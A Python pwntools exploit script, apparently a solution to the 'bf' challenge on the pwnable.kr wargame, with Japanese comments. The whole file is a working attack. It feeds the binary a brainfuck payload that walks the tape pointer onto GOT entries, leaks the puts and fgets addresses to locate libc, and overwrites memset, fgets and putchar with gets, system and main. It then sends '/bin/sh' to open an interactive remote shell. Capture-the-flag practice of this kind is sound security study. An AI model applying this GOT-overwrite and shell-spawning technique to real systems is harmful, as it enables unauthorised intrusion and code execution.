# encoding: utf-8
import math
import struct
from pwn import *
import sys

if len(sys.argv) != 2:
    log.info("Usage: python solv.py [local|remote]")
    exit()

"""
< * 20 でpointerの値をを直接書き換える
pointerをputcharのgotに合わせてgotを書き換える。

"""

"""
静的解析
"""
elf = ELF("bf");
libc = ELF("libc.so.6");

pointer_pos = 0x0804a0a0

got_puts = elf.got["puts"]
got_fgets = elf.got["fgets"]
got_memset = elf.got["memset"]
got_putchar = elf.got["putchar"]

libc_fgets_offset = libc.sym["fgets"]
libc_gets_offset = libc.sym["gets"]
libc_system_offset = libc.sym["system"]
libc_memset_offset = libc.sym["memset"]
libc_puts_offset = libc.sym["puts"]
libc_putchar_offset = libc.sym["putchar"]

main_addr = p32(elf.sym["main"])

"""
exploit
"""
def shift(now_addr, to_addr):
    offset = to_addr - now_addr
    if offset > 0:
        return (">" * offset)
    else:
        return ("<" * -offset)

context(os="linux", arch="i386")
context.log_level = 'debug'

if sys.argv[1] == "remote":
    p = remote("pwnable.kr", 9001);
elif sys.argv[1] == "local":
    p = process("./bf", env={"LD_PRELOAD": "./libc.so.6"});

# [1] read puts address and fgets addr
payload  = shift(pointer_pos, got_puts)
payload += ".>" * 4 + "<" * 4
payload += shift(got_puts, got_fgets)
payload += ".>" * 4 + "<" * 4
# [2] replace memset to gets
payload += shift(got_fgets, got_memset)
payload += ",>" * 4 + "<" * 4
# [3] replace fgets to system
payload += shift(got_memset, got_fgets)
payload += ",>" * 4 + "<" * 4
# [4] replace putchar to main
payload += shift(got_fgets, got_putchar)
payload += ",>" * len(main_addr)
payload += "."

if len(payload) > 0x400:
    print("payload length is very Big!!")
    exit()

p.recvuntil("]\n")
p.sendline(payload)
# [1] read puts address
puts_addr = u32(p.recv(1) + p.recv(3))
fgets_addr = u32(p.recv(4))

if fgets_addr-puts_addr == libc_fgets_offset - libc_puts_offset:
    log.info("Great!! addr is matching")
else:
    log.info("Hummm... something is wrong")
# [2] replace memset to gets
gets_addr = puts_addr + (libc_gets_offset - libc_puts_offset)
p.send(p32(gets_addr))
# [3] replace fgets to system
system_addr = puts_addr + (libc_system_offset - libc_puts_offset)
p.send(p32(system_addr))
# [4] replace putchar to main
p.send(main_addr)
p.send(b"/bin/sh\x00\r\n")
p.recvuntil("]\n")
p.interactive()
